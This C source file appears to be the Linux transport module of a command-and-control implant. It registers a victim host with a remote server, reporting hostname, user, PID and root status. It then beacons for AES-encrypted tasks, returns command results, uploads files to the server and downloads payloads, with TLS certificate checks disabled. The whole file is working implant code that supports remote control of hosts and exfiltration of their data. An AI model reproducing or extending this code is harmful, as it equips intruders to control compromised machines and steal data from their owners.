/* transport_linux.c — HTTP/HTTPS transport for Linux using POSIX sockets + OpenSSL.
 * Implements the full transport.h API.  Only the HTTP/HTTPS transport is supported
 * (no DNS/SMB/TCP on Linux for now). */
#ifndef _WIN32
#include "transport.h"
#include "config.h"
#include "crypto.h"
#include "b64.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

/* ── Singleton agent state ───────────────────────────────────────────────── */
AgentState g_agent = {0};

/* ── Transport mutex ─────────────────────────────────────────────────────── */
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;
static void transport_lock(void)   { pthread_mutex_lock(&g_lock); }
static void transport_unlock(void) { pthread_mutex_unlock(&g_lock); }

/* ── URL parser ──────────────────────────────────────────────────────────── */
typedef struct {
    int  is_https;
    char host[256];
    int  port;
    char base[512];   /* path prefix from URL, e.g. "" or "/api" */
} ParsedURL;

static ParsedURL parse_url(const char *url) {
    ParsedURL r;
    memset(&r, 0, sizeof(r));
    const char *rest;
    if (strncmp(url, "https://", 8) == 0) { r.is_https = 1; rest = url + 8; r.port = 443; }
    else if (strncmp(url, "http://", 7) == 0) { rest = url + 7; r.port = 80; }
    else { rest = url; r.port = 80; }

    const char *slash = strchr(rest, '/');
    char host_port[256] = {0};
    if (slash) {
        size_t n = (size_t)(slash - rest);
        if (n >= sizeof(host_port)) n = sizeof(host_port) - 1;
        memcpy(host_port, rest, n);
        strncpy(r.base, slash, sizeof(r.base) - 1);
    } else {
        strncpy(host_port, rest, sizeof(host_port) - 1);
    }
    char *colon = strrchr(host_port, ':');
    if (colon) { *colon = '\0'; r.port = atoi(colon + 1); }
    strncpy(r.host, host_port, sizeof(r.host) - 1);
    return r;
}

/* ── TCP connect ─────────────────────────────────────────────────────────── */
static int tcp_connect(const char *host, int port) {
    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%d", port);

    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) return -1;

    int fd = socket(res->ai_family, SOCK_STREAM, 0);
    if (fd < 0) { freeaddrinfo(res); return -1; }

    if (connect(fd, res->ai_addr, (socklen_t)res->ai_addrlen) != 0) {
        close(fd); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);
    return fd;
}

/* ── Abstract connection (plain or TLS) ─────────────────────────────────── */
typedef struct {
    int   fd;
    SSL  *ssl;
} Conn;

static int conn_send(Conn *c, const void *buf, size_t len) {
    if (c->ssl) {
        int n = SSL_write(c->ssl, buf, (int)len);
        return (n == (int)len) ? 0 : -1;
    }
    size_t sent = 0;
    while (sent < len) {
        ssize_t n = send(c->fd, (const char*)buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    return 0;
}

static int conn_recv(Conn *c, void *buf, int len) {
    if (c->ssl) return SSL_read(c->ssl, buf, len);
    return (int)recv(c->fd, buf, (size_t)len, 0);
}

static void conn_close(Conn *c, SSL_CTX *ctx) {
    if (c->ssl) { SSL_shutdown(c->ssl); SSL_free(c->ssl); c->ssl = NULL; }
    if (ctx)    { SSL_CTX_free(ctx); }
    if (c->fd >= 0) { close(c->fd); c->fd = -1; }
}

/* ── Read full HTTP response (reads until connection close) ──────────────── */
static int read_response_all(Conn *c, uint8_t **out, size_t *out_len) {
    size_t cap = 65536, len = 0;
    uint8_t *buf = (uint8_t*)malloc(cap);
    if (!buf) return 0;

    for (;;) {
        if (len + 4096 >= cap) {
            cap *= 2;
            uint8_t *nb = (uint8_t*)realloc(buf, cap);
            if (!nb) { free(buf); return 0; }
            buf = nb;
        }
        int n = conn_recv(c, buf + len, (int)(cap - len - 1));
        if (n <= 0) break;
        len += (size_t)n;
    }
    buf[len] = '\0';
    *out     = buf;
    *out_len = len;
    return 1;
}

/* ── Core HTTP request ───────────────────────────────────────────────────── */
/*
 * Issues method + full_path against AGENT_SERVER_URL.
 * On success: allocates *resp_out (caller must free), sets *resp_len, *status.
 * extra_hdr: optional extra header line(s), already terminated with \r\n.
 */
static int http_do_inner(const char *method, const char *full_path,
                         const uint8_t *body, size_t body_len,
                         const char *extra_hdr,
                         uint8_t **resp_out, size_t *resp_len, int *status) {
    *resp_out = NULL; *resp_len = 0; *status = 0;

    ParsedURL p = parse_url(AGENT_SERVER_URL);

    int fd = tcp_connect(p.host, p.port);
    if (fd < 0) return 0;

    Conn c = { fd, NULL };
    SSL_CTX *ctx = NULL;

    if (p.is_https) {
        ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) { close(fd); return 0; }
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);   /* accept self-signed */
        c.ssl = SSL_new(ctx);
        if (!c.ssl) { conn_close(&c, ctx); return 0; }
        SSL_set_fd(c.ssl, fd);
        SSL_set_tlsext_host_name(c.ssl, p.host);          /* SNI */
        if (SSL_connect(c.ssl) <= 0) { conn_close(&c, ctx); return 0; }
    }

    /* Build HTTP/1.1 request */
    char hdr[4096];
    int hdr_len = snprintf(hdr, sizeof(hdr),
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %zu\r\n"
        "%s"
        "Connection: close\r\n"
        "\r\n",
        method, full_path, p.host, AGENT_USER_AGENT,
        body_len,
        extra_hdr ? extra_hdr : "");

    int ok = 0;
    if (conn_send(&c, hdr, (size_t)hdr_len) != 0)              goto cleanup;
    if (body_len > 0 && conn_send(&c, body, body_len) != 0)    goto cleanup;

    /* Read entire response */
    uint8_t *raw = NULL;
    size_t   raw_len = 0;
    if (!read_response_all(&c, &raw, &raw_len) || raw_len == 0) goto cleanup;

    /* Parse status line:  HTTP/1.1 <status> ... */
    {
        char *sp = strchr((char*)raw, ' ');
        if (!sp) { free(raw); goto cleanup; }
        *status = atoi(sp + 1);
    }

    /* Locate end of headers */
    char *body_start = strstr((char*)raw, "\r\n\r\n");
    if (!body_start) { free(raw); goto cleanup; }
    body_start += 4;
    size_t body_off = (size_t)(body_start - (char*)raw);
    size_t body_sz  = raw_len - body_off;

    /* Decode chunked if needed */
    if (strstr((char*)raw, "Transfer-Encoding: chunked") ||
        strstr((char*)raw, "transfer-encoding: chunked")) {
        uint8_t *decoded = (uint8_t*)malloc(body_sz + 1);
        if (!decoded) { free(raw); goto cleanup; }
        size_t dlen = 0;
        char  *cp   = body_start;
        for (;;) {
            char *crlf = strstr(cp, "\r\n");
            if (!crlf) break;
            size_t csz = strtoul(cp, NULL, 16);
            if (csz == 0) break;
            cp = crlf + 2;
            if (dlen + csz > body_sz) csz = body_sz - dlen;
            memcpy(decoded + dlen, cp, csz);
            dlen += csz;
            cp   += csz + 2;   /* skip trailing \r\n after chunk data */
        }
        decoded[dlen] = '\0';
        free(raw);
        *resp_out = decoded;
        *resp_len = dlen;
    } else {
        /* Content-Length or read-until-close — we already have it all */
        uint8_t *bd = (uint8_t*)malloc(body_sz + 1);
        if (!bd) { free(raw); goto cleanup; }
        memcpy(bd, body_start, body_sz);
        bd[body_sz] = '\0';
        free(raw);
        *resp_out = bd;
        *resp_len = body_sz;
    }
    ok = 1;

cleanup:
    conn_close(&c, ctx);
    return ok;
}

/* Private HTTP helper (no lock — callers take lock as needed) */
static int http_do(const char *method, const char *path,
                   const uint8_t *body, size_t body_len,
                   uint8_t **resp_out, size_t *resp_len, int *status) {
    ParsedURL p = parse_url(AGENT_SERVER_URL);
    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s%s", p.base, path);
    return http_do_inner(method, full_path, body, body_len, NULL,
                         resp_out, resp_len, status);
}

/* ── Public agent_http_do (used by pivot modules; no-op on Linux) ─────────── */
int agent_http_do(const char *method, const char *path,
                  const uint8_t *body, size_t body_len,
                  const char *extra_hdr,
                  uint8_t **resp_out, size_t *resp_len, int *status) {
    ParsedURL p = parse_url(AGENT_SERVER_URL);
    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s%s", p.base, path);
    return http_do_inner(method, full_path, body, body_len, extra_hdr,
                         resp_out, resp_len, status);
}

/* ── JSON mini-helpers (duplicated from transport.c for the Linux build) ─── */

static int json_hex_digit(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static size_t json_decode_string(const char *start, char *out, size_t out_sz) {
    const char *p = start;
    size_t n = 0;
    while (*p && *p != '"') {
        unsigned char ch = (unsigned char)*p++;
        if (ch == '\\' && *p) {
            ch = (unsigned char)*p++;
            switch (ch) {
            case '"': case '\\': case '/': break;
            case 'b': ch = '\b'; break;
            case 'f': ch = '\f'; break;
            case 'n': ch = '\n'; break;
            case 'r': ch = '\r'; break;
            case 't': ch = '\t'; break;
            case 'u': {
                int h0 = json_hex_digit(p[0]), h1 = json_hex_digit(p[1]);
                int h2 = json_hex_digit(p[2]), h3 = json_hex_digit(p[3]);
                if (h0 >= 0 && h1 >= 0 && h2 >= 0 && h3 >= 0) {
                    unsigned cp = (unsigned)((h0 << 12) | (h1 << 8) |
                                             (h2 << 4) | h3);
                    p += 4;
                    ch = cp < 0x80 ? (unsigned char)cp : '?';
                } else {
                    ch = 'u';
                }
                break;
            }
            default: break;
            }
        }
        if (out && out_sz > 1 && n < out_sz - 1) out[n] = (char)ch;
        n++;
    }
    if (out && out_sz) out[n < out_sz ? n : out_sz - 1] = '\0';
    return n;
}

static int json_str(const char *json, const char *key, char *out, size_t out_sz) {
    if (!json || !key || !out || out_sz == 0) return 0;
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    if (*p != '"') return 0;
    json_decode_string(p + 1, out, out_sz);
    return 1;
}

static char* json_str_alloc(const char *json, const char *key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return NULL;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    if (*p != '"') return NULL;
    p++;
    const char *start = p;
    while (*p && *p != '"') { if (*p == '\\' && p[1]) p++; p++; }
    size_t len = (size_t)(p - start);
    char *out = (char*)malloc(len + 1);
    if (!out) return NULL;
    json_decode_string(start, out, len + 1);
    return out;
}

static long long json_int(const char *json, const char *key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return -1;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    return strtoll(p, NULL, 10);
}

static const char* next_obj(const char *p, const char **end) {
    while (*p && *p != '{') p++;
    if (!*p) return NULL;
    int depth = 0;
    const char *start = p;
    while (*p) {
        if (*p == '"') { p++; while (*p && *p != '"') { if (*p=='\\') p++; if (*p) p++; } }
        else if (*p == '{') depth++;
        else if (*p == '}') { depth--; if (depth == 0) { *end = p; return start; } }
        if (*p) p++;
    }
    return NULL;
}

/* Public wrappers (used by transport modules and commands) */
int agent_json_str(const char *json, const char *key, char *out, size_t out_sz) {
    return json_str(json, key, out, out_sz);
}
char* agent_json_str_alloc(const char *json, const char *key) {
    return json_str_alloc(json, key);
}
long long agent_json_int(const char *json, const char *key) {
    return json_int(json, key);
}
const char* agent_json_next_obj(const char *p, const char **end) {
    return next_obj(p, end);
}

/* ── JSON escape ─────────────────────────────────────────────────────────── */
static char* json_escape(const char *s) {
    if (!s) return strdup("");
    size_t len = strlen(s);
    char *out = (char*)malloc(len * 2 + 1);
    if (!out) return NULL;
    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        if      (s[i] == '"')  { out[j++] = '\\'; out[j++] = '"'; }
        else if (s[i] == '\\') { out[j++] = '\\'; out[j++] = '\\'; }
        else if (s[i] == '\n') { out[j++] = '\\'; out[j++] = 'n'; }
        else if (s[i] == '\r') { out[j++] = '\\'; out[j++] = 'r'; }
        else if (s[i] == '\t') { out[j++] = '\\'; out[j++] = 't'; }
        else                     out[j++] = s[i];
    }
    out[j] = '\0';
    return out;
}

/* ── Task array parse (shared with DoH/TCP transport modules) ────────────── */
AgentTask* agent_parse_tasks(const uint8_t *plain, size_t plain_len, int *count) {
    *count = 0;
    (void)plain_len;
    const char *tasks_start = strstr((const char*)plain, "\"tasks\"");
    if (!tasks_start) return NULL;
    tasks_start = strchr(tasks_start, '[');
    if (!tasks_start) return NULL;
    tasks_start++;

    int cap = 16;
    AgentTask *tasks = (AgentTask*)calloc((size_t)cap, sizeof(AgentTask));
    if (!tasks) return NULL;

    const char *p = tasks_start, *obj_end;
    while ((p = next_obj(p, &obj_end)) != NULL) {
        size_t obj_len = (size_t)(obj_end - p) + 1;
        char *obj = (char*)malloc(obj_len + 1);
        if (!obj) break;
        memcpy(obj, p, obj_len);
        obj[obj_len] = '\0';

        if (*count >= cap) {
            cap *= 2;
            AgentTask *nt = (AgentTask*)realloc(tasks, (size_t)cap * sizeof(AgentTask));
            if (!nt) { free(obj); break; }
            tasks = nt;
        }

        AgentTask *t  = &tasks[*count];
        t->id          = json_int(obj, "id");
        json_str(obj, "type", t->type, sizeof(t->type));
        t->args        = json_str_alloc(obj, "args");
        t->payload     = NULL;
        t->payload_len = 0;

        char *pl_b64 = json_str_alloc(obj, "payload");
        if (pl_b64 && pl_b64[0])
            t->payload = b64_decode(pl_b64, &t->payload_len);
        free(pl_b64);
        free(obj);

        (*count)++;
        p = obj_end + 1;
        if (*p == ']') break;
    }
    return tasks;
}

/* ── tasks_free ──────────────────────────────────────────────────────────── */
void tasks_free(AgentTask *tasks, int count) {
    if (!tasks) return;
    for (int i = 0; i < count; i++) {
        free(tasks[i].args);
        free(tasks[i].payload);
    }
    free(tasks);
}

/* ── agent_register ──────────────────────────────────────────────────────── */

/* Helper: get process name from /proc/self/comm */
static void get_proc_name(char *buf, size_t sz) {
    FILE *f = fopen("/proc/self/comm", "r");
    if (f) {
        if (fgets(buf, (int)sz, f)) {
            /* strip newline */
            char *nl = strchr(buf, '\n');
            if (nl) *nl = '\0';
        }
        fclose(f);
    } else {
        strncpy(buf, "agent", sz - 1);
    }
}

static int is_root(void) { return (geteuid() == 0); }

int agent_register(void) {
    /* Only HTTP/HTTPS on Linux */
    char hostname[128] = "unknown", username[128] = "unknown";
    gethostname(hostname, sizeof(hostname) - 1);
    char *login = getlogin();
    if (login) strncpy(username, login, sizeof(username) - 1);

    char proc_name[64] = "agent";
    get_proc_name(proc_name, sizeof(proc_name));

    char body[1024];
    snprintf(body, sizeof(body),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"linux/amd64\","
        "\"pid\":%d,\"transport\":\"https\","
        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\","
        "\"is_admin\":%s,\"language\":\"c\"}",
        hostname, username, (int)getpid(),
        AGENT_SLEEP_SEC, AGENT_JITTER_PCT, proc_name,
        is_root() ? "true" : "false");

    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!http_do("POST", "/register",
                 (const uint8_t*)body, strlen(body),
                 &resp, &resp_len, &status) || status != 200 || !resp) {
        free(resp); return 0;
    }

    char agent_id[64] = {0}, aes_key_b64[128] = {0};
    json_str((char*)resp, "agent_id", agent_id,     sizeof(agent_id));
    json_str((char*)resp, "aes_key",  aes_key_b64,  sizeof(aes_key_b64));
    free(resp);

    if (!agent_id[0] || !aes_key_b64[0]) return 0;

    size_t key_len = 0;
    uint8_t *key = b64_decode(aes_key_b64, &key_len);
    if (!key || key_len < 32) { free(key); return 0; }

    strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
    memcpy(g_agent.aes_key, key, 32);
    g_agent.has_key = 1;
    free(key);
    return 1;
}

int agent_http_register(void) { return agent_register(); }

/* ── agent_beacon ────────────────────────────────────────────────────────── */
AgentTask* agent_beacon(int *count) {
    *count = 0;
    if (!g_agent.has_key) return NULL;

    char path[256];
    snprintf(path, sizeof(path), "/beacon/%s", g_agent.agent_id);

    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    transport_lock();
    int ok = http_do("GET", path, NULL, 0, &resp, &resp_len, &status);
    transport_unlock();

    if (!ok || status == 204 || status != 200 || !resp) { free(resp); return NULL; }

    size_t plain_len = 0;
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, resp, resp_len, &plain_len);
    free(resp);
    if (!plain) return NULL;

    AgentTask *tasks = agent_parse_tasks(plain, plain_len, count);
    free(plain);
    return tasks;
}

/* ── Encrypted result sender ─────────────────────────────────────────────── */
static void send_enc(const char *path, const char *json_body) {
    if (!g_agent.has_key) return;
    size_t enc_len = 0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32,
                                (const uint8_t*)json_body, strlen(json_body),
                                &enc_len);
    if (!enc) return;
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    http_do("POST", path, enc, enc_len, &resp, &resp_len, &status);
    free(resp); free(enc);
}

/* ── agent_send_result_admin ─────────────────────────────────────────────── */
void agent_send_result_admin(long long task_id, const char *output,
                              const char *error, int is_admin) {
    char *esc_out = json_escape(output ? output : "");
    char *esc_err = json_escape(error  ? error  : "");
    size_t json_sz = (esc_out ? strlen(esc_out) : 0) +
                     (esc_err ? strlen(esc_err) : 0) + 128;
    char *body = (char*)malloc(json_sz);
    if (body) {
        snprintf(body, json_sz,
            "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
            task_id,
            esc_out ? esc_out : "",
            esc_err ? esc_err : "",
            is_admin ? "true" : "false");
        char path[128];
        snprintf(path, sizeof(path), "/result/%s", g_agent.agent_id);
        transport_lock();
        send_enc(path, body);
        transport_unlock();
        free(body);
    }
    free(esc_out); free(esc_err);
}

void agent_send_result(long long task_id, const char *output, const char *error) {
    agent_send_result_admin(task_id, output, error, is_root());
}

/* ── File transfer ───────────────────────────────────────────────────────── */
void agent_upload_file(long long task_id, const char *filename,
                       const uint8_t *data, size_t data_len) {
    if (!g_agent.has_key) return;
    (void)task_id;
    size_t enc_len = 0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32, data, data_len, &enc_len);
    if (!enc) return;
    char path[256];
    snprintf(path, sizeof(path), "/upload/%s/%s", g_agent.agent_id, filename);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    transport_lock();
    http_do("POST", path, enc, enc_len, &resp, &resp_len, &status);
    transport_unlock();
    free(resp); free(enc);
}

uint8_t* agent_download_file(const char *filename, size_t *out_len) {
    *out_len = 0;
    if (!g_agent.has_key) return NULL;
    char path[256];
    snprintf(path, sizeof(path), "/dl/%s/%s", g_agent.agent_id, filename);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!http_do("GET", path, NULL, 0, &resp, &resp_len, &status) ||
        status != 200 || !resp) { free(resp); return NULL; }
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, resp, resp_len, out_len);
    free(resp);
    return plain;
}

#endif /* !_WIN32 */
